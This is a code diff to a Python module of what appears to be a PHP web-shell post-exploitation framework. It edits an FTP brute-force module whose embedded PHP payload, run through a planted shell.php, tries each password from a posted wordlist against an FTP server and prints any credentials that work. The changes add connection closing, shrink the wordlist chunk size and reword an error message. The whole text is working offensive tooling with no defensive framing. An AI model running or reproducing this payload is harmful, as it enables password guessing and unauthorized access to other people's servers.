@@ -18,16 +18,17 @@ class Ftp(Module):
     vectors = VectorList([
             Vector('shell.php', 'brute_ftp_php', [ """$h="%s"; $p="%s"; $u="%s"; $w=$_POST["%s"]; 
 foreach(split('[\n]+',$w) as $pwd) {
-$c=@ftp_connect($h, $p);
+$c=@ftp_connect("$h", "$p");
 if($c){
-$l=@ftp_login($c,$u,$pwd);
+$l=@ftp_login($c,"$u","$pwd");
 if($l) {
 print("+" . $u . ":" . $pwd . "\n");
 break;
 }
 }
-} 
-""", """$h="%s"; $p="%s"; $c=@ftp_connect($h, $p); if($c) { print(1); }"""])
+ftp_close($c);
+}
+""", """$h="%s"; $p="%s"; $c=@ftp_connect($h, $p); if($c) { print(1); }; ftp_close($c);"""])
             ])
 
     
@@ -42,7 +43,7 @@ break;
 
     def __init__( self, modhandler , url, password):
         
-        self.chunksize = 5000
+        self.chunksize = 50
         self.substitutive_wl = []
         Module.__init__(self, modhandler, url, password)
         
@@ -103,7 +104,7 @@ break;
         payload_check = self.__prepare_payload(vector, [host, port], 1) 
         response_check = self.modhandler.load(vector.interpreter).run({0: payload_check})
         if response_check != '1':
-            self.mprint('[%s] Error, port \'%s:%i\' close' % (self.name, host, port))
+            self.mprint('[%s] Error: service not available on \'%s:%i\'' % (self.name, host, port))
         else:
             if len(wl) > self.chunksize:
                 self.mprint('[%s] Splitting wordlist of %i words in %i chunks of %i words.' % (self.name, len(wl), chunks+1, self.chunksize))
